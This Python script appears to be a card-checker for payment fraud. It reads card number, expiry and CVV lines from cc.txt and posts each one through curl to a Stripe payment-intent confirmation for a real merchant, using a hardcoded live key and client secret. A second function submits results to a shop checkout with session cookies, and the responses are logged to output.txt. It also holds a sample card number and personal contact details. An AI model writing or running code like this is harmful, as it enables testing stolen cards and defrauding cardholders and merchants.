import subprocess
import json

file_path = "data.txt"
def stripe(cc,mes,ano,cvv):
    command = f"""curl 'https://api.stripe.com/v1/payment_intents/pi_3NUAy7JUEaToEfDJ0vHxORtJ/confirm' \
  -H 'authority: api.stripe.com' \
  -H 'accept: application/json' \
  -H 'accept-language: en-IN,en;q=0.9' \
  -H 'content-type: application/x-www-form-urlencoded' \
  -H 'origin: https://js.stripe.com' \
  -H 'referer: https://js.stripe.com/' \
  -H 'sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Linux"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-site' \
  -H 'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36' \
  --data-raw 'payment_method_data[type]=card&payment_method_data[metadata][frequency]=One-time&payment_method_data[metadata][amount]=%245.44&payment_method_data[metadata][cover_fee]=true&payment_method_data[billing_details][name]=Vrishni+Pkd&payment_method_data[billing_details][email]=pkdart589%40gmail.com&payment_method_data[billing_details][phone]=%2B912228502777&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_month]={mes}&payment_method_data[card][exp_year]={ano}&payment_method_data[guid]=093ccd23-c308-4f30-b7ef-60ab56dd78659964e5&payment_method_data[muid]=6bfd4342-ca18-423f-a19f-e193718eeddfe13ab3&payment_method_data[sid]=c713fe72-a1bb-4060-9710-698a432b8062dab315&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2Fc68765f93f%3B+stripe-js-v3%2Fc68765f93f%3B+card-element&payment_method_data[time_on_page]=58463&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51Kcq27JUEaToEfDJu0SRm2EblqBSgx9NKcoLS1imQayAoYLszrLGF2XdFq3MPG3l066fTzoNtyNlpEjpHx6Z1na500CuldwA17&client_secret=pi_3NUAy7JUEaToEfDJ0vHxORtJ_secret_ro2lnxEpaY9hYyhLKUPB0nraB' \
  --compressed"""
    process = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
    output, _ = process.communicate()
    command_output = output.decode()
    json_output = json.loads(command_output)
    print(json_output)
    return json_output

# stripe(5357386252340543,'09',2026,523)

def check(id):
    command = f"""curl 'https://ninjadownloadmanager.com/wp-admin/admin-ajax.php' \
  -H 'Accept: application/json, text/javascript, */*; q=0.01' \
  -H 'Accept-Language: en-IN,en;q=0.9' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H 'Cookie: PHPSESSID=2on71jruj3sl3e7sbb3haq1a3i; racart=ed286690-8403-49c4-bef3-fa40f5c08037; ra_customer_id=5vhl6lpt__c031afde-95e8-451a-adbb-2db90fe3f772; _ga=GA1.2.1361718799.1689433430; _gid=GA1.2.2045714404.1689433431; _ga_PP5QTN70Q5=GS1.1.1689433430.1.1.1689433508.0.0.0; ra_customer_email=pkdart589@gmail.com; edd_items_in_cart=1' \
  -H 'Origin: https://ninjadownloadmanager.com' \
  -H 'Referer: https://ninjadownloadmanager.com/checkout/' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36' \
  -H 'X-Requested-With: XMLHttpRequest' \
  -H 'sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Linux"' \
  --data-raw 'action=edds_process_purchase_form&form_data=edd-discount%3D%26edd_email%3Dpkdart589%2540gmail.com%26edd_first%3DJImmy%26edd_last%3DJoy%26card_name%3DJiimmy%2520Joy%26card_address%3D178%2520%252Cshop%2520No.%252C%2520Rangari%2520Bldg%252C%2520Dadasaheb%2520Phalke%2520Road%252C%2520Dadar(e)%26card_address_2%3DSt%2520Cross%2520Lane%252C%2520Chowpatty%26card_city%3DMumbai%26card_zip%3D400059%26billing_country%3DIN%26card_state%3DKL%26vat_number%3D%26edd-checkout-address-fields-nonce%3Dcf3f58bd73%26edd_agree_to_privacy_policy%3D1%26edd_action%3Dpurchase%26edd-gateway%3Dstripe%26edd-process-checkout-nonce%3D7ea373b418&payment_method_id={id}&payment_method_exists=false' \
  --compressed"""
    process = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
    output, _ = process.communicate()
    command_output = output.decode()
    json_output = json.loads(command_output)
    
    print(json_output)
    return json_output



# Open the text file
with open('cc.txt', 'r') as file:
    # Read each line in the file
    for line in file:
        # Remove leading/trailing whitespaces and split the line by '|'
        values = line.strip().split('|')
        
        # Store the values in separate variables
        value1 = values[0]
        value2 = values[1]
        value3 = values[2]
        value4 = values[3]
        idd = stripe(value1, value2, value3, value4)
        with open("output.txt", 'a') as output_file:
            output_file.write(str(line) + str(idd) + '\n')

